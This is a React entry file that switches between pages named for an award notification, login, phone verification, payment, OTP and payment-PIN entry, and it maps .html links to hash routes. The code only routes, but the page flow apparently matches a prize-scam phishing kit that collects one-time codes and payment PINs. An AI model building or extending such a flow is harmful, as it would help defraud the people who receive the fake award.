import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'

// Components
import Landing from './landing.jsx'
import Login from './Login.jsx'
import AwardNotification from './awardNotification.jsx'
import PhoneVerification from './PhoneVerfication.jsx'
import Pay from './Pay.jsx'
import OTP from './OTP.jsx'
import PayPinVerification from './PayPinVerfication.jsx'
import Submit from './Submit.jsx'
import Success from './Success.jsx'
import ViewAward from './ViewAward.jsx'

const pages = {
  landing: Landing,
  login: Login,
  award: AwardNotification,
  awardnotification: AwardNotification,
  'award-notification': AwardNotification,
  phone: PhoneVerification,
  phoneverification: PhoneVerification,
  phoneverfication: PhoneVerification,
  'phone-verification': PhoneVerification,
  pay: Pay,
  otp: OTP,
  pin: PayPinVerification,
  paypinverification: PayPinVerification,
  paypinverfication: PayPinVerification,
  'pay-pin-verification': PayPinVerification,
  submit: Submit,
  success: Success,
  viewaward: ViewAward,
  'view-award': ViewAward,
  viewAward: ViewAward,
}

const root = createRoot(document.getElementById('root'))

function getSelected() {
  const search = new URLSearchParams(window.location.search)
  const byQuery = search.get('page')
  const raw = (window.location.hash ? window.location.hash.slice(1) : byQuery) || 'landing'
  const key = decodeURIComponent(raw).toLowerCase()
  return pages[key] || Landing
}

function render() {
  const Selected = getSelected()
  root.render(
    <StrictMode>
      <Selected />
    </StrictMode>,
  )
}

// Initial render and re-render on navigation changes
render()
window.addEventListener('hashchange', render)
window.addEventListener('popstate', render)

// Intercept anchor clicks that point to *.html and translate to hash routes
const htmlToHash = {
  'index.html': '#landing',
  'landing.html': '#landing',
  'login.html': '#login',
  'phoneverification.html': '#phone',
  'phoneverfication.html': '#phone',
  'phoneVerification.html': '#phone',
  'otp.html': '#otp',
  'OTP.html': '#otp',
  'pay.html': '#pay',
  'paypinverification.html': '#pin',
  'payPinVerification.html': '#pin',
  'payPinVerfication.html': '#pin',
  'success.html': '#success',
  'viewaward.html': '#viewaward',
  'ViewAward.html': '#viewaward',
  'view-award.html': '#viewaward',
}

document.addEventListener('click', (e) => {
  const anchor = e.target && (e.target.closest ? e.target.closest('a[href]') : null)
  if (!anchor) return
  const href = (anchor.getAttribute('href') || '').trim()
  const mapped = htmlToHash[href.toLowerCase()] || htmlToHash[href]
  if (mapped) {
    e.preventDefault()
    window.location.hash = mapped.slice(1)
  }
})
